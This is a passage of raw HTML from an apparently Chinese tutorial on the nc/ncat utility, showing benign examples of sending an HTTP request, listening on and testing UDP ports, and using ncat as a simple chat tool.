class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nGET / HTTP/1.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a48a968004636-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a48a968004636-1\"><span class=\"crayon-v\">GET</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HTTP</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者获取页面名称，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a48d404229310\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nGET / HTTP/1.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a48d404229310-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a48d404229310-1\"><span class=\"crayon-v\">GET</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HTTP</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者我们可以通过以下方式获得操作系统指纹标识，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a490484785185\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nGET / HTTP/1.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a490484785185-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a490484785185-1\"><span class=\"crayon-v\">GET</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HTTP</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这会告诉我们使用的是什么软件来运行这个 web 服务器的。</p>\n<h3 id=\"toc_3\">例子： 3) 连接 UDP 端口</h3>\n<p>默认情况下，<code>nc</code> 创建连接时只会连接 TCP 端口。 不过我们可以使用 <code>-u</code> 选项来连接到 UDP 端口，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a494745710313\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l -u 1234</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a494745710313-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a494745710313-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1234</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在我们的系统会开始监听 UDP 的 1234 端口，我们可以使用下面的 <code>netstat</code> 命令来验证这一点，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a497747029422\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ netstat -tunlp | grep 1234\r\nudp           0          0 0.0.0.0:1234                 0.0.0.0:*               17341/nc\r\nudp6          0          0 :::1234                      :::*                    17341/nc</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a497747029422-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6354523a497747029422-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6354523a497747029422-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a497747029422-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">netstat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tunlp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1234</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6354523a497747029422-2\"><span class=\"crayon-i\">udp</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1234</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">17341</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nc</span></div><div class=\"crayon-line\" id=\"crayon-5a6354523a497747029422-3\"><span class=\"crayon-i\">udp6</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">::</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1234</span><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">::</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">17341</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nc</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>假设我们想发送或者说测试某个远程主机 UDP 端口的连通性，我们可以使用下面命令，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a49a094418648\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -v -u {host-ip} {udp-port}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a49a094418648-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a49a094418648-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ip</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">udp</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">port</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>比如：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a49d644798493\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@localhost ~]# ncat -v -u 192.168.105.150 53\r\nNcat: Version 6.40 ( http://nmap.org/ncat )\r\nNcat: Connected to 192.168.105.150:53。</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a49d644798493-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6354523a49d644798493-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6354523a49d644798493-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a49d644798493-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ncat -v -u 192.168.105.150 53</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6354523a49d644798493-2\"><span class=\"crayon-v\">Ncat</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Version</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.40</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//nmap.org/ncat )</span></div><div class=\"crayon-line\" id=\"crayon-5a6354523a49d644798493-3\"><span class=\"crayon-v\">Ncat</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Connected </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.105.150</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">53</span>。</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">例子： 4) 将 <code>nc</code> 作为聊天工具</h3>\n<p><code>nc</code> 也可以作为聊天工具来用，我们可以配置服务器监听某个端口，然后从远程主机上连接到服务器的这个端口，就可以开始发送消息了。 在服务器这端运行：<code></code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4a1501345901\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4a1501345901-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4a1501345901-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在远程客户端主机上运行：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4a4575727966\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4a4575727966-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4a4575727966-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span 